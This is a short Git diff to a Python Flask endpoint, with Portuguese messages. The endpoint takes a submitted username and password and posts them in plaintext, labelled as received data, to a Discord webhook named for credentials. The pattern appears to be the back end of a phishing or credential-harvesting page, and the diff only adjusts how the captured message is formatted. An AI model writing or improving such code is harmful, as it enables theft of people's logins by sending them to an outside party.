@@ -22,15 +22,13 @@ def send_message():
     if not username or not password:
         return jsonify({"error": "Campos obrigatórios ausentes"}), 400
 
-    message = {
-        "content": (
+    message = (
             f"------------------------------------------------------------------\n"
             f"**DADOS RECEBIDOS:**\n"
             f"Usuário: {username}\n"
             f"Senha: {password}\n"
             f"------------------------------------------------------------------\n"
-        )
-    }
+    )
 
     payload = {"content": message}
     response = requests.post(DISCORD_WEBHOOK_URL_CREDENTIALS, json=payload)
